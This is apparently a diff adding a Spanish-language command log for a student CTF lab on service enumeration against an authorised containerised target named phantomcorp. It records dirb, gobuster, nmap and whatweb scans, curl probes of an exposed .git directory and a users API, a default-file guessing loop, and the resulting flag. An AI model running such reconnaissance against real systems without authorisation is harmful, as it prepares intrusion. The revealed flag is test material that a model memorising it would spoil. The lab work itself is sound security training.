@@ -1,0 +1,69 @@
+# Bitácora de comandos — Lab 06 (Grupo 06)
+# Todos los comandos se ejecutaron en la consola atacante (contenedor
+# cyberlab-attacker) contra el target autorizado phantomcorp, salvo que se
+# indique lo contrario. Las salidas crudas se conservan en evidencias/.
+
+# --- Fecha/entorno ---
+# docker compose -p cyberlab --project-directory . \
+#   -f entorno/docker-compose.yml \
+#   -f labs/lab06-enumeracion-de-servicios/entorno/target.compose.yml up -d --build
+# make shell (equivalente: docker exec -it cyberlab-attacker bash)
+
+# --- R1 — Enumeración de directorios (dirb) ---
+dirb http://phantomcorp/ -S
+curl -sS -i http://phantomcorp/backup
+
+# --- R2 — Repositorio Git expuesto ---
+curl -sS -i http://phantomcorp/.git/config
+curl -sS -i http://phantomcorp/.git/HEAD
+curl -sS -i http://phantomcorp/.git/logs/HEAD
+curl -sS -i http://phantomcorp/.git/
+
+# --- R3 — Métodos HTTP ---
+curl -X OPTIONS -i http://phantomcorp/
+nmap --script http-methods,http-enum phantomcorp
+
+# --- R4 — Usuarios vía API ---
+curl -i http://phantomcorp/api/users
+./ctf status 06
+
+# --- R5 — Fingerprinting (whatweb) y enumeración dirigida ---
+whatweb http://phantomcorp
+whatweb -a 3 http://phantomcorp
+nmap -Pn --script http-enum phantomcorp -p80
+gobuster dir -u http://phantomcorp -w /usr/share/dirb/wordlists/big.txt
+# Consultas dirigidas adicionales (cabeceras, métodos, rutas default, UA, Host):
+curl -sS -i http://phantomcorp/
+for p in /changelog /version /robots.txt /readme.txt /sitemap.xml /docs /info.php; do curl -sS -i "http://phantomcorp$p"; done
+curl -sS -i -X OPTIONS http://phantomcorp/
+nmap -Pn -sV -p1-10000 phantomcorp
+
+# --- Cierre ---
+./ctf submit 06 R5 'FLAG{...}'
+./ctf status 06
+
+# --- Re-ejecución de verificación previa al PR (2026-10-28, consola atacante) ---
+# Objetivo: respaldar con salidas crudas las afirmaciones del R5 declaradas
+# como "aspecto no verificado" en el informe (dónde exponía la flag la instancia).
+for p in /changelog /version /robots.txt /readme.txt /sitemap.xml /docs /info.php; do curl -sS -i --max-time 5 "http://phantomcorp$p"; done
+#   -> Los archivos default devolvieron 404 Not Found.
+#   -> Salida cruda: evidencias/lab06-r5-probes-defaults.txt
+gobuster dir -u http://phantomcorp -w /usr/share/dirb/wordlists/big.txt
+#   -> 20470 rutas probadas; solo /admin (403) y /backup (200), ya inventariadas.
+#   -> Salida cruda: evidencias/lab06-r5-gobuster-big.txt
+bash /tmp/lab06-ctf/ctf status 06
+
+# --- R5: búsqueda dirigida del archivo default (2026-10-30, consola atacante) ---
+# La respuesta con la flag de R5 no había quedado guardada; se repitió la
+# búsqueda dirigida a partir del fingerprinting, sin leer el código del target.
+whatweb --color=never -a 3 http://phantomcorp > lab06-r5-whatweb-a3.txt
+# Listas de productos de dirb (vulns/*.txt, 12444 palabras): solo /admin y /backup.
+cat /usr/share/dirb/wordlists/vulns/*.txt | sort -u > /tmp/vulns-all.txt
+dirb http://phantomcorp/ /tmp/vulns-all.txt -S -r
+# common.txt con extensiones: solo /admin y /backup.
+gobuster dir -q -u http://phantomcorp -w /usr/share/dirb/wordlists/common.txt -x txt,html,md,php,xml,json,bak,old
+# Nombres default combinados con directorios del producto (253 rutas):
+for d in "" phantomcms/ phantom/ cms/ PhantomCMS/ admin/ static/ assets/ core/ docs/ doc/; do for f in readme README readme.txt README.txt readme.html README.md leeme.txt LEEME.txt LEEME version.txt VERSION CHANGELOG CHANGELOG.txt changelog license.txt LICENSE phantomcms.txt phantomcms.xml phantomcms.json manifest.xml manifest.json config.xml install.txt; do echo "$(curl -s -o /dev/null -w "%{http_code}" "http://phantomcorp/$d$f") /$d$f"; done; done > lab06-r5-busqueda-dirigida.txt
+#   -> Única respuesta distinta de 404: 200 /phantomcms/VERSION
+curl -sS -i http://phantomcorp/phantomcms/VERSION > lab06-r5-default-file.txt
+#   -> PhantomCMS 3.7 (build 2024-11) + FLAG{tech_fingerprint_phantomcms}
